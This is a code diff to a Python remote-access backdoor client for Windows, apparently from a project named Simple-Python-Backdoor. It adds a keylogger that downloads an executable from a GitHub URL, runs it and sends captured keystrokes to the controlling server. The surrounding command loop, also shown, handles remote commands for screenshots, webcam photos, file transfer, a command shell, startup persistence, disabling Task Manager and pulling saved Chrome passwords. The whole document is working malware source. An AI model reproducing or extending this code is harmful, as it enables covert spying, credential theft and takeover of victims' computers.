@@ -1,11 +1,9 @@
-import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser
+import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser, sqlite3
 import win32console, win32gui, win32api, winerror, win32event, win32crypt
 import pygame.camera, pygame.image
-import sqlite3
+import urllib.request
 from shutil import copyfile
 from winreg import *
-
-# sys.stderr = None  # prevent errors from being shown
 
 strHost = ""
 # strHost = socket.gethostbyname("")
@@ -295,40 +293,91 @@ def chrpass():  # legal purposes only!
     time.sleep(0.2)
     objSocket.send(str.encode(strResults))
 
-while True:
-    strData = objSocket.recv(1024)
-    strData = decode_utf8(strData)
 
-    if strData == "exit":
-        objSocket.close()
-        sys.exit(0)
-    elif strData[:3] == "msg":
-        msg(strData)
-    elif strData[:4] == "site":
-        webbrowser.open(strData[4:len(strData)])
-    elif strData == "startup":
-        startup()
-    elif strData == "info":
-        info()
-    elif strData == "screen":
-        screenshot()
-    elif strData == "filebrowser":
-        file_browser()
-    elif strData[:4] == "send":
-        upload(strData[4:len(strData)])
-    elif strData[:4] == "recv":
-        receive(strData[4:len(strData)])
-    elif strData == "shutreslock":
-        shut_res_lock()
-    elif strData == "test":
-        continue
-    elif strData == "cmd":
-        command_shell()
-    elif strData == "webpic":
-        webcam_pic()
-    elif strData == "chrpass":
-        chrpass()
-    elif strData == "dtaskmgr":
-        if not "blnDisabled" in globals():  # if the variable doesnt exist yet
-            blnDisabled = "True"
-        disable_taskmgr()
+def keylogger(option):
+    if option == "start":
+        if not os.path.isfile(TMP + "/spbkhost.exe"):
+            try:
+                urllib.request.urlretrieve("https://github.com/xp4xbox/Simple-Python-Backdoor/blob/master/keylogger/keylogger?raw=true", TMP + "/spbkhost.exe")
+            except:  # if the file cannot be downloaded
+                objSocket.send(str.encode("error"))
+                return
+
+        subprocess.Popen(TMP + "/spbkhost.exe", shell=True)  # start the keylogger
+        objSocket.send(str.encode("success"))
+
+    elif option == "stop":
+        # give the signal to stop
+        objSettings = open(TMP + "/spbky.txt", "w")
+        objSettings.write("stop")
+        objSettings.close()
+
+    elif option == "dump":
+        command = subprocess.check_output("tasklist", shell=True)
+        if not b"spbkhost.exe" in command:  # check if keylogger is running
+            objSocket.send(str.encode("error"))
+            return
+
+        objSettings = open(TMP + "/spbky.txt", "w")
+        objSettings.write("dump")  # give signal to dump
+        objSettings.close()
+
+        time.sleep(2)
+        objTxtFile = open(TMP + "/spblog.txt", "r")  # read logs
+        strLogs = objTxtFile.read()
+        objTxtFile.close()
+
+        time.sleep(0.2)
+        objSocket.send(str.encode(str(len(strLogs))))  # send buffer size
+        time.sleep(0.2)
+        objSocket.send(str.encode(strLogs))  # send logs
+
+try:
+    while True:
+        strData = objSocket.recv(1024)
+        strData = decode_utf8(strData)
+
+        if strData == "exit":
+            objSocket.close()
+            keylogger("stop")
+            sys.exit(0)
+        elif strData[:3] == "msg":
+            msg(strData)
+        elif strData[:4] == "site":
+            webbrowser.open(strData[4:len(strData)])
+        elif strData == "startup":
+            startup()
+        elif strData == "info":
+            info()
+        elif strData == "screen":
+            screenshot()
+        elif strData == "filebrowser":
+            file_browser()
+        elif strData[:4] == "send":
+            upload(strData[4:len(strData)])
+        elif strData[:4] == "recv":
+            receive(strData[4:len(strData)])
+        elif strData == "shutreslock":
+            shut_res_lock()
+        elif strData == "test":
+            continue
+        elif strData == "cmd":
+            command_shell()
+        elif strData == "webpic":
+            webcam_pic()
+        elif strData == "chrpass":
+            chrpass()
+        elif strData == "keystart":
+            keylogger("start")
+        elif strData == "keystop":
+            keylogger("stop")
+        elif strData == "keydump":
+            keylogger("dump")
+        elif strData == "dtaskmgr":
+            if not "blnDisabled" in globals():  # if the variable doesnt exist yet
+                blnDisabled = "True"
+            disable_taskmgr()
+except socket.error:  # if the server closes without warning
+    objSocket.close()
+    keylogger("stop")
+    sys.exit(0)
